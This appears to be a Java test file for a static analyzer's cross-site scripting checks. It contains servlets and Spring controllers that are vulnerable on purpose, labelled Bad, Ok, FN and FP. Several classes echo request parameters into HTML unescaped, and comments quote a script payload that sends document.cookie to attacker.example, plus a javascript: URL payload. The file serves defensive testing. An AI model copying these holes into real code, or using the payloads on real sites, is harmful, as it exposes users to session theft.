/*
 * Copyright (c) Facebook, Inc. and its affiliates.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE file in the root directory of this source tree.
 */

package codetoanalyze.java.pulse;

import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.apache.commons.text.StringEscapeUtils;
import org.owasp.encoder.Encode;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.util.HtmlUtils;

// Pages written with the PrintWriter of the response. A name such as
// "<script>fetch('https://attacker.example/?c=' + document.cookie)</script>" runs in the browser
// of whoever opens the page. The request handlers of servlets are inherited from HttpServlet, so
// the class names say whether they are expected to report.

class CrossSiteScripting {}

class GreetingServletBad extends HttpServlet {

  @Override
  protected void doGet(HttpServletRequest request, HttpServletResponse response)
      throws ServletException, IOException {
    response.getWriter().println("<h1>Hello " + request.getParameter("name") + "</h1>");
  }
}

class SearchServletBad extends HttpServlet {

  @Override
  protected void doGet(HttpServletRequest request, HttpServletResponse response)
      throws ServletException, IOException {
    response.getWriter().printf("<p>No results for %s</p>", request.getParameter("q"));
  }
}

class CommentServletBad extends HttpServlet {

  @Override
  protected void doPost(HttpServletRequest request, HttpServletResponse response)
      throws ServletException, IOException {
    PrintWriter page = response.getWriter();
    page.write("<li>");
    page.write(request.getParameter("comment"));
    page.write("</li>");
  }
}

class HomeServletOk extends HttpServlet {

  @Override
  protected void doGet(HttpServletRequest request, HttpServletResponse response)
      throws ServletException, IOException {
    response.getWriter().println("<h1>Welcome</h1>");
  }
}

// the name is HTML-escaped, so the browser displays it as text
class EscapedGreetingServletOk extends HttpServlet {

  @Override
  protected void doGet(HttpServletRequest request, HttpServletResponse response)
      throws ServletException, IOException {
    String name = StringEscapeUtils.escapeHtml4(request.getParameter("name"));
    response.getWriter().println("<h1>Hello " + name + "</h1>");
  }
}

class EncodedSearchServletOk extends HttpServlet {

  @Override
  protected void doGet(HttpServletRequest request, HttpServletResponse response)
      throws ServletException, IOException {
    String query = Encode.forHtml(request.getParameter("q"));
    response.getWriter().printf("<p>No results for %s</p>", query);
  }
}

// HTML escaping does not make a value safe as a URL: "javascript:alert(document.cookie)" has no
// character to escape, and runs when the link is clicked.
class FN_EscapedLinkServletBad extends HttpServlet {

  @Override
  protected void doGet(HttpServletRequest request, HttpServletResponse response)
      throws ServletException, IOException {
    String url = StringEscapeUtils.escapeHtml4(request.getParameter("website"));
    response.getWriter().println("<a href=\"" + url + "\">website</a>");
  }
}

// The comment is written to a file, not to a page. `PrintWriter` is a sink wherever it writes.
class FP_CommentLogServletOk extends HttpServlet {

  @Override
  protected void doPost(HttpServletRequest request, HttpServletResponse response)
      throws ServletException, IOException {
    try (PrintWriter log = new PrintWriter(new FileWriter("/var/log/comments.log", true))) {
      log.println(request.getParameter("comment"));
    }
  }
}

// Spring MVC

@RestController
class GreetingController {

  @GetMapping("/hello")
  void helloBad(@RequestParam("name") String name, HttpServletResponse response)
      throws IOException {
    response.getWriter().print("<h1>Hello " + name + "</h1>");
  }

  @GetMapping("/v2/hello")
  void helloEscapedOk(@RequestParam("name") String name, HttpServletResponse response)
      throws IOException {
    response.getWriter().print("<h1>Hello " + HtmlUtils.htmlEscape(name) + "</h1>");
  }

  @GetMapping("/welcome")
  void welcomeOk(HttpServletResponse response) throws IOException {
    response.getWriter().print("<h1>Welcome</h1>");
  }
}
